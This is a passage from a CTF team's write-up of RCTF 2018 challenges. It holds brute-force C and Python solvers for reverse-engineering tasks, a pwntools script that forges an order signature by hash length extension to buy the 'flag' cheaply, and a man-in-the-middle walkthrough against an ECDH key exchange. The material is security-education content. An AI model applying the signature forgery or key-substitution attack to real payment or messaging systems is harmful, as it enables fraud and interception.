class="built_in">printf</span>(<span class="string">"%c"</span>, buf[j]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	base = val / <span class="number">0x8B</span>;</span><br><span class="line"></span><br><span class="line">	v = (base) * <span class="number">0x8B</span>;</span><br><span class="line">	ch = v ^ val;</span><br><span class="line">	<span class="keyword">if</span> (ch &gt;= <span class="number">0x20</span> &amp;&amp; ch &lt; <span class="number">0x7F</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		buf[i] = ch;</span><br><span class="line">		foo(i + <span class="number">1</span>, base);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	v = (base + <span class="number">1</span>) * <span class="number">0x8B</span>;</span><br><span class="line">	ch = v ^ val;</span><br><span class="line">	<span class="keyword">if</span> (ch &gt;= <span class="number">0x20</span> &amp;&amp; ch &lt; <span class="number">0x7F</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		buf[i] = ch;</span><br><span class="line">		foo(i + <span class="number">1</span>, base + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	foo(<span class="number">0</span>, <span class="number">13340610174042144018</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line">	foo(<span class="number">0</span>, <span class="number">95741437967718225</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line">	foo(<span class="number">0</span>, <span class="number">484886919005526</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>_no_seAms<br>_NoR_nEe<br>Dlework</p>
</blockquote>
<p>flag: <strong>RCTF{Without_no_seAms_NoR_nEeDlework}</strong> </p>
<h3 id="simple-re"><a href="#simple-re" class="headerlink" title="simple re"></a>simple re</h3><p>校验函数sub_401482.</p>
<p>穷举第一段24个字符:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> aa[<span class="number">6</span>], bb[<span class="number">6</span>], cc[<span class="number">6</span>], j;</span><br><span class="line">	<span class="keyword">uint64_t</span> n, m;</span><br><span class="line">	<span class="keyword">char</span> *p;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	bb[<span class="number">0</span>] = <span class="number">0x556E4969</span>;</span><br><span class="line">	bb[<span class="number">1</span>] = <span class="number">0x2E775361</span>;</span><br><span class="line">	bb[<span class="number">2</span>] = <span class="number">0x893DAE7</span>;</span><br><span class="line">	bb[<span class="number">3</span>] = <span class="number">0x96990423</span>;</span><br><span class="line">	bb[<span class="number">4</span>] = <span class="number">0x6CF9D3E9</span>;</span><br><span class="line">	bb[<span class="number">5</span>] = <span class="number">0xA505531F</span>;</span><br><span class="line">	aa[<span class="number">0</span>] = <span class="number">0x54A0B9BD</span>;</span><br><span class="line">	aa[<span class="number">1</span>] = <span class="number">0x4B818640</span>;</span><br><span class="line">	aa[<span class="number">2</span>] = <span class="number">0x8EB63387</span>;</span><br><span class="line">	aa[<span class="number">3</span>] = <span class="number">0xA9EABEFD</span>;</span><br><span class="line">	aa[<span class="number">4</span>] = <span class="number">0xB8CDF96B</span>;</span><br><span class="line">	aa[<span class="number">5</span>] = <span class="number">0x113C3052</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j != <span class="number">0xFFFFFFFF</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			n = j * <span class="number">0x100000000</span>;</span><br><span class="line">			n += aa[i];</span><br><span class="line">			<span class="keyword">if</span> (n % bb[i] == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				cc[i] = n / bb[i];</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"cc[%d] == %08X\n"</span>, i, cc[i]);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	p = (<span class="keyword">char</span>*)cc;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>, p[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>cc[0] == 4D5F6F35<br>cc[1] == 5F796E40<br>cc[2] == 69376E61<br>cc[3] == 7665525F<br>cc[4] == 69737233<br>cc[5] == 545F676E<br>5o_M@ny_an7i_Rev3rsing_T</p>
</blockquote>
<p>穷举第二段8个字符:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> foo1(<span class="keyword">uint16_t</span> a1, <span class="keyword">uint16_t</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">uint16_t</span> v2; <span class="comment">// ST16_2</span></span><br><span class="line">	<span class="keyword">uint16_t</span> i; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">	<span class="keyword">uint16_t</span> v5; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">	v5 = a1;</span><br><span class="line">	<span class="keyword">for</span> (i = a2; i &amp; v5; i = <span class="number">2</span> * (i &amp; v2))</span><br><span class="line">	&#123;</span><br><span class="line">		v2 = v5;</span><br><span class="line">		v5 ^= i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> i | v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> foo2(<span class="keyword">uint32_t</span> x, <span class="keyword">uint32_t</span> y, <span class="keyword">uint32_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> yy; <span class="comment">// [rsp+4h] [rbp-18h]</span></span><br><span class="line">	<span class="keyword">uint64_t</span> v5; <span class="comment">// [rsp+Ch] [rbp-10h]</span></span><br><span class="line">	<span class="keyword">uint64_t</span> v6; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">	yy = y;</span><br><span class="line">	v6 = <span class="number">1L</span>L;</span><br><span class="line">	v5 = x;</span><br><span class="line">	<span class="keyword">while</span> (yy)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (yy &amp; <span class="number">1</span>)</span><br><span class="line">			v6 = v5 * v6 % n;</span><br><span class="line">		v5 = v5 * v5 % n;</span><br><span class="line">		yy &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">int</span> i1, i2, i3, i4, i5, i6, i7, i8, i, j, v;</span><br><span class="line">	<span class="keyword">uint32_t</span> *p1;</span><br><span class="line">	<span class="keyword">uint16_t</span> *p2, *p3;</span><br><span class="line">	p1 = (<span class="keyword">uint32_t</span> *)(buf + <span class="number">0</span>);</span><br><span class="line">	p2 = (<span class="keyword">uint16_t</span> *)(buf + <span class="number">4</span>);</span><br><span class="line">	p3 = (<span class="keyword">uint16_t</span> *)(buf + <span class="number">6</span>);</span><br><span class="line">	<span class="keyword">for</span> (i1 = <span class="number">0x20</span>; i1 &lt; <span class="number">0x7F</span>; i1++)</span><br><span class="line">	&#123;</span><br><span class="line">		buf[<span class="number">4</span>] = i1;</span><br><span class="line">		<span class="keyword">for</span> (i2 = <span class="number">0x20</span>; i2 &lt; <span class="number">0x7F</span>; i2++)</span><br><span class="line">		&#123;</span><br><span class="line">			buf[<span class="number">5</span>] = i2;</span><br><span class="line">			<span class="keyword">for</span> (i3 = <span class="number">0x20</span>; i3 &lt; <span class="number">0x7F</span>; i3++)</span><br><span class="line">			&#123;</span><br><span class="line">				buf[<span class="number">6</span>] = i3;</span><br><span class="line">				<span class="keyword">for</span> (i4 = <span class="number">0x20</span>; i4 &lt; <span class="number">0x7F</span>; i4++)</span><br><span class="line">				&#123;</span><br><span class="line">					buf[<span class="number">7</span>] = i4;</span><br><span class="line">					<span class="keyword">if</span> (foo1(*p2, *p3) == <span class="number">0xA496</span>) <span class="comment">// -----</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">for</span> (i5 = <span class="number">0x20</span>; i5 &lt; <span class="number">0x7F</span>; i5++)</span><br><span class="line">						&#123;</span><br><span class="line">							buf[<span class="number">0</span>] = i5;</span><br><span class="line">							<span class="keyword">for</span> (i6 = <span class="number">0x20</span>; i6&lt; <span class="number">0x7F</span>; i6++)</span><br><span class="line">							&#123;</span><br><span class="line">								buf[<span class="number">1</span>] = i6;</span><br><span class="line">								<span class="keyword">for</span> (i7 = <span class="number">0x20</span>; i7 &lt; <span class="number">0x7F</span>; i7++)</span><br><span class="line">								&#123;</span><br><span class="line">									buf[<span class="number">2</span>] = i7;</span><br><span class="line">									<span class="comment">// -------- i8</span></span><br><span class="line">									buf[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">									v = <span class="number">0</span>;</span><br><span class="line">									<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">									&#123;</span><br><span class="line">										v ^= buf[i];</span><br><span class="line">									&#125;</span><br><span class="line">									i8 = <span class="number">22</span> ^ v;</span><br><span class="line">									<span class="keyword">if</span> (i8 &lt; <span class="number">0x7F</span> &amp;&amp; i8 &gt; <span class="number">0x20</span>)</span><br><span class="line">									&#123;</span><br><span class="line">										buf[<span class="number">3</span>] = i8;</span><br><span class="line">										<span class="keyword">if</span> (foo2(*p1, *p2, <span class="number">0xF64BB17D</span>) == <span class="number">0x6F82C8DC</span>)</span><br><span class="line">										&#123;</span><br><span class="line">											<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">											&#123;</span><br><span class="line">												<span class="built_in">printf</span>(<span class="string">"%c"</span>, buf[i]);</span><br><span class="line">											&#125;</span><br><span class="line">											<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">										&#125;</span><br><span class="line">									&#125;</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>echn!qu3</p>
</blockquote>
<p>第33个字符’s’</p>
<p>flag: <strong>RCTF{5o_M@ny_an7i_Rev3rsing_Techn!qu3s}</strong> </p>
<h3 id="babyre2"><a href="#babyre2" class="headerlink" title="babyre2"></a><strong>babyre2</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> data[<span class="number">8</span>] =</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0x2B7192452905E8FB</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x7BA58F82BD898035</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xA3112746582E1434</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x163F756FCC221AB0</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xECC78E6FB9CBA1FE</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xDCDD8B49EA5D7E14</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xA2845FE0B3096F8E</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xAAAAAAAAAA975D1C</span>,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> mull[<span class="number">8</span>] =</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0x20656D6F636C6557</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x2046544352206F74</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x6548202138313032</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x2061207369206572</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x6320455279626142</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x65676E656C6C6168</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x756F7920726F6620</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xFFFFFFFFFFFF002E</span>,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> modd = <span class="number">0xFFFFFFFFFFFFFFC5</span>;</span><br><span class="line"></span><br><span class="line">(input[i] * mull[i]) % modd = data[i]</span><br></pre></td></tr></table></figure>
<p>(A * mull) % modd = data 化成 A % modd = data*mull^(-1)</p>
<p>再A=data*mull^(-1) modd，然后上脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>     <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> a!=<span class="number">0</span>:</span><br><span class="line">            a,b = b%a,a</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"><span class="comment">#定义一个函数，参数分别为a,n，返回值为b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>     <span class="title">findModReverse</span><span class="params">(a,m)</span>:</span><span class="comment">#这个扩展欧几里得算法求模逆</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> gcd(a,m)!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        u1,u2,u3 = <span class="number">1</span>,<span class="number">0</span>,a</span><br><span class="line">        v1,v2,v3 = <span class="number">0</span>,<span class="number">1</span>,m</span><br><span class="line">        <span class="keyword">while</span> v3!=<span class="number">0</span>:</span><br><span class="line">            q = u3//v3</span><br><span class="line">            v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3</span><br><span class="line">        <span class="keyword">return</span> u1%m</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> findModReverse(<span class="number">3</span>,<span class="number">11</span>)</span><br><span class="line">d = <span class="number">0xFFFFFFFFFFFFFFC5</span></span><br><span class="line">a = [<span class="number">0x20656D6F636C6557</span>,<span class="number">0x2046544352206F74</span>,<span class="number">0x6548202138313032</span>,<span class="number">0x2061207369206572</span>,<span class="number">0x6320455279626142</span>,<span class="number">0x65676E656C6C6168</span>,<span class="number">0x756F7920726F6620</span>,<span class="number">0xFFFFFFFFFFFF002E</span>]</span><br><span class="line">a_re = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	num = findModReverse(i,d)</span><br><span class="line">	<span class="comment">#print hex(num)</span></span><br><span class="line">	a_re.append(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = [<span class="number">0x2B7192452905E8FB</span>,<span class="number">0x7BA58F82BD898035</span>,<span class="number">0xA3112746582E1434</span>,<span class="number">0x163F756FCC221AB0</span>,<span class="number">0xECC78E6FB9CBA1FE</span>,<span class="number">0xDCDD8B49EA5D7E14</span>,<span class="number">0xA2845FE0B3096F8E</span>,<span class="number">0xAAAAAAAAAA975D1C</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#for j in range(len(a)):</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(len(a)):</span><br><span class="line">	<span class="comment">#print k</span></span><br><span class="line">	num = (a_re[k] * data[k]) % d</span><br><span class="line">	<span class="keyword">print</span> hex(num),hex(num)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">	flag += hex(num)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
<h2 id="0x04-Crypto"><a href="#0x04-Crypto" class="headerlink" title="0x04 Crypto"></a>0x04 Crypto</h2><h3 id="cpushop"><a href="#cpushop" class="headerlink" title="cpushop"></a><strong>cpushop</strong></h3><p>nc连接是个cpu商店，flag很贵买不起，支付时验证了order，order的sign由一个随机signkey和订单信息生成，可能存在哈希长度拓展攻击，通过修改价格买下flag</p>
<p>(打扰了，signkey的长度为random.randint(8,32))</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/25dd65951d9e883f7c89bd46ec5e4c7f.png?raw=true" alt></p>
<p>通过哈希长度拓展攻击来修改订单价格</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/35d7256716e8eff78af2ffd41f79379a.png?raw=true" alt><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line">s=remote(<span class="string">'cpushop.2018.teamrois.cn'</span>,<span class="number">43000</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Command:'</span>)</span><br><span class="line">s.sendline(<span class="string">'1'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Command:'</span>)</span><br><span class="line">s.sendline(<span class="string">'2'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Product ID:'</span>)</span><br><span class="line">s.sendline(<span class="string">'9'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Your order:'</span>)</span><br><span class="line">s.recvline()</span><br><span class="line">a=s.recvline()</span><br><span class="line">timestamp=a[<span class="number">35</span>:<span class="number">51</span>]</span><br><span class="line">sign=a[<span class="number">57</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line"><span class="keyword">print</span> timestamp</span><br><span class="line"><span class="keyword">print</span> sign,len(sign)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">32</span>):</span><br><span class="line">hax=hashpumpy.hashpump(sign,<span class="string">'product=Flag&amp;price=99999&amp;timestamp='</span>+timestamp,<span class="string">'&amp;product=Flag&amp;price=9&amp;timestamp='</span>+timestamp,i)</span><br><span class="line">	<span class="comment">#print hax</span></span><br><span class="line">	payload=hax[<span class="number">1</span>]+<span class="string">'&amp;sign='</span>+hax[<span class="number">0</span>]</span><br><span class="line">	<span class="comment">#print payload</span></span><br><span class="line">	s.recvuntil(<span class="string">'Command:'</span>)</span><br><span class="line">	s.sendline(<span class="string">'3'</span>)</span><br><span class="line">	s.recvuntil(<span class="string">'Your order:'</span>)</span><br><span class="line">	s.sendline(payload)</span><br><span class="line">	pp=s.recvline()</span><br><span class="line">	<span class="keyword">print</span> pp</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"Order"</span> <span class="keyword">not</span> <span class="keyword">in</span> pp:</span><br><span class="line">		s.interactive()</span><br><span class="line"></span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="ECDH"><a href="#ECDH" class="headerlink" title="ECDH"></a><strong>ECDH</strong></h3><p>查阅资料得到：<a href="https://github.com/esxgx/easy-ecc" target="_blank" rel="noopener">https://github.com/esxgx/easy-ecc</a></p>
<p>和几个关键字：ECDH、secp128r1、AES、ECB</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/76b9dcf63ead383913bcb280a9b3847e.png?raw=true" alt></p>
<p>github项目有4个函数：生成密钥、计算共享密钥、签名、验证签名</p>
<p>首先要问Alice和bob的公钥，然后交换给对方，Alice才会说出密文，Bob只会把密文告诉Alice</p>
<p>大概就是用中间人攻击获取明文</p>
<p>emm。。现在会生成密钥对了，但是不知道怎么解密。。</p>
<p>使用自己的私钥和Bob的公钥生成的共享密钥 解<br>Alice发出的密文：失败（其实是可以成功，就是要自己写脚本）</p>
<p><strong>过程：</strong></p>
<p>生成自己的密钥对</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/c51aad457fccc3f3a1b1a2c90971439b.png?raw=true" alt></p>
<p>找bob要pubkey，顺便把自己的pubkey作为alice的pubkey给bob</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/11d96a67c04fd1acf7a343af01029103.png?raw=true" alt></p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/324b64fa098f1f7943a1cca08b6d02a2.png?raw=true" alt></p>
<p>结合自己的prikey和bob的pubkey生成shared_key</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/46c909aa1290c107b4896dc543c16b0b.png?raw=true" alt></p>
<p>找bob把flag发给alice，再去alice那边接收密文</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/ec2c093149a70879bef86bc16c80fcae.png?raw=true" alt></p>
<p>用shared_key作为密钥，用AES的ECB模式解密Alice给的密文</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/ed0487584190c201a1c8237910eaa95e.png?raw=true" alt><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># aes_decrypt.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 